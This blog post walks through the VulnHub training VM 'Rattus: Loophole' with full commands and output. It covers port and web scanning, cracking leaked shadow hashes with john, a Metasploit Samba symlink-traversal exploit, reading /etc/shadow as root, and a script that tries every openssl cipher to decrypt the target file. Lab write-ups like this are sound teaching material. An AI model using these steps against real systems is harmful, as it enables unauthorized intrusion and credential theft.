---
layout: post
title: "Rattus: Loophole"
date: 2015-05-16 16:14:09 +0200
comments: true
categories: [vulnhub, rattus]
---
Image: [Rattus: Loophole](https://www.vulnhub.com/entry/rattus-loophole,27/)

Our objective was to find and decrypt the 'Private.doc.enc' file.  When we
boot the image, we can see the network information. With ipcalc we display the
possible hosts:
{% codeblock %}
root@kali32:~# ipcalc 10.8.7.0/255.255.255.248
Address:   10.8.7.0             00001010.00001000.00000111.00000 000
Netmask:   255.255.255.248 = 29 11111111.11111111.11111111.11111 000
Wildcard:  0.0.0.7              00000000.00000000.00000000.00000 111
=>
Network:   10.8.7.0/29          00001010.00001000.00000111.00000 000
HostMin:   10.8.7.1             00001010.00001000.00000111.00000 001
HostMax:   10.8.7.6             00001010.00001000.00000111.00000 110
Broadcast: 10.8.7.7             00001010.00001000.00000111.00000 111
Hosts/Net: 6                     Class A, Private Internet
{% endcodeblock %}

We assign the last IP address from network 10.8.7.0/29:
{% codeblock %}
root@kali32:~# ifconfig eth0:1 10.8.7.6
{% endcodeblock %}

Nmap output:
{% codeblock %}
root@kali32:~# nmap -sV 10.8.7.2 -p-

Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-25 12:25 CEST
Nmap scan report for 10.8.7.2
Host is up (0.0017s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.4 (protocol 1.99)
80/tcp  open  http        Apache httpd 1.3.31 ((Unix) PHP/4.4.4)
113/tcp open  ident?
139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
MAC Address: 00:0C:29:53:2F:A3 (VMware)
{% endcodeblock %}

Nikto output:
{% codeblock %}
root@kali32:~# nikto -h 10.8.7.2
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.8.7.2
+ Target Hostname:    10.8.7.2
+ Target Port:        80
+ Start Time:         2015-05-08 18:41:31 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/1.3.31 (Unix) PHP/4.4.4
+ Server leaks inodes via ETags, header found with file /, inode: 20924, size: 3001, mtime: Fri Feb 18 12:33:59 2011
+ The anti-clickjacking X-Frame-Options header is not present.
+ OSVDB-637: Enumeration of users is possible by requesting ~username (responds with 'Forbidden' for users, 'not found' for non-existent users).
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header
+ PHP/4.4.4 appears to be outdated (current is at least 5.4.26)
+ Apache/1.3.31 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE, POST, PUT, DELETE, CONNECT, PATCH, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ HTTP method ('Allow' Header): 'CONNECT' may allow server to proxy client requests.
+ HTTP method: 'PATCH' may allow client to issue patch commands to server. See RFC-5789.
+ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ WebDAV enabled (UNLOCK LOCK MKCOL COPY PROPPATCH PROPFIND listed as allowed)
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ Retrieved x-powered-by header: PHP/4.4.4
+ OSVDB-3092: /info/: This might be interesting...
+ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ 7355 requests: 0 error(s) and 22 item(s) reported on remote host
+ End Time:           2015-05-08 18:41:43 (GMT2) (12 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
{% endcodeblock %}

Dirb output:
{% codeblock %}
==> DIRECTORY: http://10.8.7.2/Images/
+ http://10.8.7.2/cgi-bin/ (CODE:403|SIZE:274)
+ http://10.8.7.2/garbage (CODE:200|SIZE:288)
+ http://10.8.7.2/index (CODE:200|SIZE:3001)
+ http://10.8.7.2/index.html (CODE:200|SIZE:3001)
+ http://10.8.7.2/info (CODE:200|SIZE:37715)
+ http://10.8.7.2/info.php (CODE:200|SIZE:37485)
+ http://10.8.7.2/status (CODE:200|SIZE:2456)
+ http://10.8.7.2/~operator (CODE:403|SIZE:275)
+ http://10.8.7.2/~root (CODE:403|SIZE:271)
{% endcodeblock %}

Most interesting file was http://10.8.7.2/garbage with these hashes:
{% codeblock %}
root:$1$x2YBL0KB$E7QI7AF9ZeiqcfMRQ4KZ11:15018:0:::::
smmsp:!!:9797:0:::::
mysql:!!:9797:0:::::
rpc:!!:9797:0:::::
sshd:!!:9797:0:::::
apache:!!:9797:0:::::
nobody:!!:9797:0:::::
mhog:$1$ZQAbXwf3$TgcNjljKW.2tlJw4OICDr1:15019:0:::::0
tskies:$1$ZvNtdn0x$ck5hnAwXg.OLQPOtg28Hb.:15019:0:::::0
{% endcodeblock %}

We were able to crack each one:
{% codeblock %}
root@kali32:~# john garbage.hash --show
root:albatros:15018:0:::::
mhog:mhog:15019:0:::::0
tskies:nostradamus:15019:0:::::0

3 password hashes cracked, 0 left
{% endcodeblock %}

Now we can log in as root via ssh, but because this was too easy, we decided to
explore samba service too.
{% codeblock %}
root@kali32:~# smbclient -L\\ -I 10.8.7.2
Enter root's password:
Anonymous login successful
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.23c]

        Sharename       Type      Comment
        ---------       ----      -------
        homes           Disk      Home directories
        tmp             Disk      Temporary file space
        IPC$            IPC       IPC Service (Samba server by Rattus labs)
Anonymous login successful
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.23c]

        Server               Comment
        ---------            -------
        LOOPHOLE             Samba server by Rattus labs

        Workgroup            Master
        ---------            -------
        WORKGROUP            LOOPHOLE


root@kali32:~# smbclient //10.8.7.2/tmp
Enter root's password:
Anonymous login successful
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.23c]
smb: \> dir
  .                                   D        0  Fri May 15 10:56:12 2015
  ..                                  D        0  Fri May 15 12:55:54 2015
  session_mm_apache0.sem              N        0  Fri May 15 10:56:12 2015
  .X11-unix                          DH        0  Fri May 15 10:56:00 2015
  .ICE-unix                          DH        0  Fri May 15 10:56:00 2015

                37571 blocks of size 4096. 0 blocks available
{% endcodeblock %}

The /tmp directory is writable. We can use samba_symlink_traversal exploit in
Metasploit:

{% codeblock %}
msf auxiliary(samba_symlink_traversal) > show options 

Module options (auxiliary/admin/smb/samba_symlink_traversal):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOST      10.8.7.2         yes       The target address
   RPORT      445              yes       Set the SMB service port
   SMBSHARE   tmp              yes       The name of a writeable share on the server
   SMBTARGET  rootfs           yes       The name of the directory that should point to the root filesystem

msf auxiliary(samba_symlink_traversal) > exploit 

[*] Connecting to the server...
[*] Trying to mount writeable share 'tmp'...
[*] Trying to link 'rootfs' to the root filesystem...
[*] Now access the following share to browse the root filesystem:
[*]     \\10.8.7.2\tmp\rootfs\

[*] Auxiliary module execution completed
{% endcodeblock %}

{% codeblock %}
root@kali32:~# smbclient //10.8.7.2/tmp
Enter root's password: 
Anonymous login successful
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.23c]
smb: \> dir
  .                                   D        0  Fri May 15 12:23:06 2015
  ..                                  D        0  Fri May 15 14:06:14 2015
  rootfs                              D        0  Fri May 15 14:06:14 2015
  session_mm_apache0.sem              N        0  Fri May 15 12:06:32 2015
  .X11-unix                          DH        0  Fri May 15 12:06:20 2015
  .ICE-unix                          DH        0  Fri May 15 12:06:20 2015

                37571 blocks of size 4096. 36565 blocks available
smb: \> cd rootfs
smb: \rootfs\> dir
  .                                   D        0  Fri May 15 14:06:14 2015
  ..                                  D        0  Fri May 15 14:06:14 2015
  root                                D        0  Fri May 15 12:06:42 2015
  var                                 D        0  Thu Sep 28 23:17:18 2006
  tmp                                 D        0  Fri May 15 12:23:06 2015
  dev                                 D        0  Fri May 15 12:06:32 2015
  sys                                 D        0  Fri May 15 14:06:07 2015
  proc                               DR        0  Fri May 15 14:06:07 2015
  boot                                D        0  Mon Feb 21 12:29:26 2011
  mnt                                 D        0  Fri May 15 14:06:14 2015
  etc                                 D        0  Fri May 15 12:06:24 2015
  usr                                 D        0  Fri Feb 18 09:10:16 2011
  srv                                 D        0  Sun Apr  8 01:30:06 2007
  sbin                                D        0  Mon Feb 14 11:35:48 2011
  opt                                 D        0  Sun Jun 10 08:23:35 2007
  lib                                 D        0  Fri Feb 18 08:39:02 2011
  home                                D        0  Mon Feb 14 12:00:31 2011
  bin                                 D        0  Mon Apr 30 06:35:12 2007

                37571 blocks of size 4096. 36565 blocks available
smb: \rootfs\> cd var\www\htdocs
smb: \rootfs\var\www\htdocs\> dir
  .                                   D        0  Fri Feb 18 12:41:43 2011
  ..                                  D        0  Tue Mar 20 10:58:04 2001
  Images                              D        0  Fri Feb 18 12:22:50 2011
  garbage                             N      288  Fri Feb 18 12:41:14 2011
  index.html                          A     3001  Fri Feb 18 12:33:59 2011
  info.php                            A       21  Fri Feb 18 12:06:04 2011
  status.html                         A     2456  Fri Feb 18 12:28:46 2011

                37571 blocks of size 4096. 36561 blocks available
{% endcodeblock %}

We suppose we should find 'garbage' file this way, but the filename was too
predictable for dirb.

We log in as root / albatros and crack the last user (jsummer): 
{% codeblock %}
[root@loophole]$  id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),17(audio),18(video),19(cdrom),26(tape),83(plugdev)
[root@loophole]$ cat /etc/shadow
root:$1$x2YBL0KB$E7QI7AF9ZeiqcfMRQ4KZ11:15018:0:::::
bin:!!:9797:0:::::
daemon:!!:9797:0:::::
adm:!!:9797:0:::::
lp:!!:9797:0:::::
sync:!!:9797:0:::::
shutdown:!!:9797:0:::::
halt:!!:9797:0:::::
mail:!!:9797:0:::::
news:!!:9797:0:::::
uucp:!!:9797:0:::::
operator:!!:9797:0:::::
games:!!:9797:0:::::
ftp:!!:9797:0:::::
smmsp:!!:9797:0:::::
mysql:!!:9797:0:::::
rpc:!!:9797:0:::::
sshd:!!:9797:0:::::
gdm:!!:9797:0:::::
apache:!!:9797:0:::::
messagebus:!!:9797:0:::::
haldaemon:!!:9797:0:::::
pop:!!:9797:0:::::
nobody:!!:9797:0:::::
mhog:$1$ZQAbXwf3$TgcNjljKW.2tlJw4OICDr1:15019:0:::::0
tskies:$1$ZvNtdn0x$ck5hnAwXg.OLQPOtg28Hb.:15019:0:::::0
jsummer:$1$28n0w2tK$YaVxVAO87McqIfRJsp6jF0:15021:0:::::0

tarot            (jsummer)
{% endcodeblock %}

Finally, we find and decrypt the file:
{% codeblock %}
[root@loophole]$ find /home/ -iname Private.doc.enc
/home/tskies/Private.doc.enc
{% endcodeblock %}

{% codeblock lang:bash %}
root@kali32:/tmp# cat crack-openssl.sh
#!/usr/bin/env bash

file=$1
key=$2

rm -rf csv ; mkdir csv
ciphers=`openssl list-cipher-commands`

for c in $ciphers; do
  openssl enc -d -"$c" -in $file -k "$key" -out csv/$file-$c-decrypted 2>/dev/ull
done
strings -n 15 csv/*
{% endcodeblock %}

{% codeblock %}
root@kali32:/tmp# ./crack-openssl.sh Private.doc.enc nostradamus
Microsoft Office Word
HEP ODS Elektrolika
Microsoft Office Word Document
Word.Document.8
^O%-|bCoB4Pa%"8x
s#dr2j;jS3zA@+[~k
.\7{9y;~515s11Y
0"/DLI*{tPmkfd|KJgX
/yNM#7n%Q`4A--I
f,^F-7H3(?p"v/,
f,^F-7H3(?p"v/,
IYgr_D)zQp>3R_  i
{% endcodeblock %}

The file that we are looking for has the name 'csv/Private.doc.enc-aes-256-cbc-decrypted'.

There is even an easier way to decrypt the file, looking to tskier's home directory:
{% codeblock %}
[root@loophole]$  cat tskies/.bash_history 
openssl enc -aes-256-cbc -e -in Private.doc -out Private.doc.enc -pass pass:nostradamus
startx
nano .bash_history 
exit
{% endcodeblock %}
